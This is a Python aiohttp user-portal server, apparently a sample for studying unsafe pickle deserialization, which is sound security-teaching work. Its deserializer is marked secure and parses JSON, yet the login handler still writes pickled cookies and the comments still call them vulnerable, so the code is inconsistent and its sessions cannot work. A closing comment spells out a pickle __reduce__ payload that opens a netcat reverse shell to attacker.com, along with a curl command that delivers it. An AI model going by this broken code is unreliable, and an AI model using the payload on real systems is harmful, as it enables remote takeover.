import os
import sqlite3
import base64
import pickle
import logging
from datetime import datetime
from aiohttp import web

# Configure logging for the User Portal
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - UserPortal - %(levelname)s - %(message)s'
)
logger = logging.getLogger("AioHttpServer")

DB_FILE = "user_portal.db"
SESSION_COOKIE_NAME = "portal_session"

def init_user_db():
    """Initializes the SQLite database for user management."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE users (
            user_id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            email TEXT NOT NULL,
            role TEXT DEFAULT 'user',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Pre-populate with some mock users
    mock_users = [
        ('admin', 'admin@local.corp', 'administrator'),
        ('jdoe', 'jdoe@local.corp', 'user'),
        ('msmith', 'msmith@local.corp', 'user')
    ]
    cursor.executemany('''
        INSERT INTO users (username, email, role)
        VALUES (?, ?, ?)
    ''', mock_users)
    
    conn.commit()
    conn.close()
    logger.info("User database initialized successfully.")

def fetch_user_data(username: str) -> dict:
    """Retrieves user profile information from the database."""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    row = cursor.fetchone()
    conn.close()
    
    if row:
        return dict(row)
    return {}

class UserSession:
    """Represents an active user session state."""
    def __init__(self, username, role, theme="light"):
        self.username = username
        self.role = role
        self.theme = theme
        self.last_accessed = datetime.now()

def deserialize_user_session(cookie_data: str) -> UserSession:
    """
    SECURE: Uses JSON instead of pickle to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    import base64
    
    logger.info("Attempting to securely deserialize user session from cookie.")
    
    try:
        # Secure: We replace the unsafe pickle module with JSON. JSON only parses 
        # primitive data structures (dicts, lists, strings, etc.) and cannot 
        # instantiate arbitrary classes or execute system commands during deserialization.
        raw_bytes = base64.b64decode(cookie_data)
        session_dict = json.loads(raw_bytes.decode('utf-8'))
        
        # Manually and safely reconstruct the UserSession object from the parsed dictionary
        if isinstance(session_dict, dict) and "username" in session_dict and "role" in session_dict:
            session_obj = UserSession(
                username=session_dict["username"],
                role=session_dict["role"],
                theme=session_dict.get("theme", "light")
            )
            logger.debug(f"Session loaded successfully for user: {session_obj.username}")
            return session_obj
        else:
            logger.warning("Deserialized JSON does not contain valid session attributes.")
            return None
            
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to parse session cookie as JSON: {e}")
        return None
    except base64.binascii.Error as e:
        logger.error(f"Failed to base64 decode session cookie: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error during session deserialization: {e}")
        return None
async def login_handler(request: web.Request) -> web.Response:
    """Handles user login and sets the serialized session cookie."""
    data = await request.post()
    username = data.get("username")
    
    user_data = fetch_user_data(username)
    if not user_data:
        return web.json_response({"error": "Invalid username or password"}, status=401)
        
    # Create a new session object
    session = UserSession(username=user_data["username"], role=user_data["role"])
    
    # Serialize the session object using pickle and base64 for cookie transport
    serialized_session = base64.b64encode(pickle.dumps(session)).decode('utf-8')
    
    response = web.json_response({
        "message": "Login successful",
        "username": username
    })
    
    # Set the vulnerable cookie containing the serialized Python object
    response.set_cookie(SESSION_COOKIE_NAME, serialized_session, httponly=True)
    logger.info(f"User {username} logged in. Serialized session cookie issued.")
    
    return response

async def profile_handler(request: web.Request) -> web.Response:
    """Returns the user profile if a valid session cookie is provided."""
    session_cookie = request.cookies.get(SESSION_COOKIE_NAME)
    
    if not session_cookie:
        return web.json_response({"error": "Unauthorized. Please log in."}, status=401)
        
    # Pass the untrusted HTTP cookie directly to the vulnerable deserialization function
    session = deserialize_user_session(session_cookie)
    
    if not session:
        return web.json_response({"error": "Invalid or expired session."}, status=403)
        
    # Fetch fresh data based on the deserialized session identity
    user_data = fetch_user_data(session.username)
    
    if user_data:
        return web.json_response({
            "profile": user_data,
            "session_theme": session.theme,
            "role": session.role
        })
    else:
        return web.json_response({"error": "User not found."}, status=404)

async def health_check(request: web.Request) -> web.Response:
    """Simple health check endpoint."""
    return web.Response(text="Portal API is running.")

def create_app() -> web.Application:
    """Configures and routes the aiohttp web application."""
    app = web.Application()
    app.add_routes([
        web.get('/health', health_check),
        web.post('/api/v1/login', login_handler),
        web.get('/api/v1/profile', profile_handler)
    ])
    return app

if __name__ == "__main__":
    init_user_db()
    
    app = create_app()
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious pickle payload using __reduce__:
    #    class Exploit:
    #        def __reduce__(self):
    #            import os
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #
    # 2. Attacker serializes and base64 encodes the payload locally: 
    #    payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    #
    # 3. Attacker sends the payload in the Cookie header to trigger code execution:
    #    curl -b "portal_session=<payload>" http://127.0.0.1:8080/api/v1/profile
    
    logger.info("Starting AioHttp User Portal on http://0.0.0.0:8080")
    web.run_app(app, host='0.0.0.0', port=8080)
